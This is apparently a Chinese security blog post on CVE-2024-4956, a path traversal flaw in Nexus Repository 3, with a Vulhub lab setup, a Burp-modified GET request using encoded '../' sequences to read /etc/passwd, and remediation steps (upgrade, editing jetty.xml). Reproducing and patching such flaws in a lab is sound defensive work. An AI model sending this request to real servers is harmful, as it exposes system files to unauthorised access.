#  CVE-2024-4956 Nexus Repository 3 路径遍历漏洞   
 海狼风暴团队   2025-06-05 09:43  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞简述**  
  
  
Nexus Repository 3 在处理用户提供的路径时存在缺陷，仅依赖 Jetty 的基础验证，未进行严格的安全检查。攻击者可构造恶意 URL 进行路径遍历，访问系统上的任意文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**受影响版本**  
  
  
Nexus Repository 3.0.0 - 3.68.0  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
# 知识扩展  
  
  
  
Nexus Repository 3是一个仓库管理工具，用于管理和托管软件构件。它支持集中存储、管理和分发构件，便于团队协作和自动化构建。  
  
**漏洞环境搭建**  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞环境搭建**  
  
  
**漏洞环境搭建**  
  
  
1.克隆 VulHub 仓库到本地  
```
git clone https://bgithub.xyz/vulhub/vulhub.git
```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibATRa7yqFTQTeYAWaz3icPicvicfrnSvjm1vURtxiapHR8eSb2U52RyXBhA/640?wx_fmt=png&from=appmsg "")  
  
2. 进入到漏洞环境目录  
```
cd vulhub/nexus/CVE-2024-4956
docker-compose up -d
```  
  
3.靶场搭建成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicB2EWqdhPBCzTKPiak5zeT98V967QnrvGrO84PCH7tRllLIx5Z2CoibFcFFdWWjFwanopsMt13jn7A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**漏洞验证**  
  
  
1.访问8081端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicB2EWqdhPBCzTKPiak5zeT9piclXvzLGZ4zFk5rBl8ru4RPUBTuvhy11gtGnZGCcoQULk7CbiacMWhw/640?wx_fmt=png&from=appmsg "")  
  
2.burp抓包，修改内容如下：  
```
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
```  
  
可见，/etc/passwd已被成功读取  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicB2EWqdhPBCzTKPiak5zeT9icNq1ly7gFvFok0ibSX3Upnm8YibIJauDYeysTzOiaiayBcCvvPWmv5XbrA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
**修复建议**  
  
  
1.  
将   
Sonatype Nexus Repository 升级到3.68.1或更高版本  
  
2.  
通过修改jetty.xml文件，禁用对/public路径的访问  
  
  
修复步骤：  
  
找到   
jetty.xml 文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicB2EWqdhPBCzTKPiak5zeT9SzDKpjIHCIeb5iaMVO3o5lETZJ1tlLrX1gF01QMPgbKRcHEOzhTd3Uw/640?wx_fmt=png&from=appmsg "")  
  
  
删除以下行：  
```
<Setname="resourceBase"><Property name="karaf.base"/>/public</Set>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicB2EWqdhPBCzTKPiak5zeT9gCbQVB4sXYyOIjgdKuEInMYVtibOOiaf8LN3tPtSpGevy2ehPmHDItVQ/640?wx_fmt=png&from=appmsg "")  
  
  
保存文件并重启环境，可以看到防御有效：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicB2EWqdhPBCzTKPiak5zeT9TKPLuKRkicOqic3wQe5sjJ5hbJay4XHEKoBLhN0MtVhPbtVgVyU22g0Q/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicdEhoEJpMqYYsP1E4bdjOibkAbcxIic2nhMdD4Y13qdEfUZibRTDvqkaQxUyOjiboJuicOB6R4z0rXPqA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicyK2l6sBbOia5wH5EwBiah4b8FiazcPnWoUwjVwhSmc8lNeib3HjMTM7t0fhtMK2z1Ascmib43KO9ibKlA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/WDYXfeKIYgicyK2l6sBbOia5wH5EwBiah4brzc4jKudCwzrLBkS3hDozqGufm3H1Za9VXuNGjGwscBhYnuyxAc05g/640?wx_fmt=jpeg&from=appmsg "undefined")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/WDYXfeKIYgicyK2l6sBbOia5wH5EwBiah4b8FiazcPnWoUwjVwhSmc8lNeib3HjMTM7t0fhtMK2z1Ascmib43KO9ibKlA/640?wx_fmt=png&from=appmsg "")  
  
**- 扫码立即关注 -**  
  
                             
  
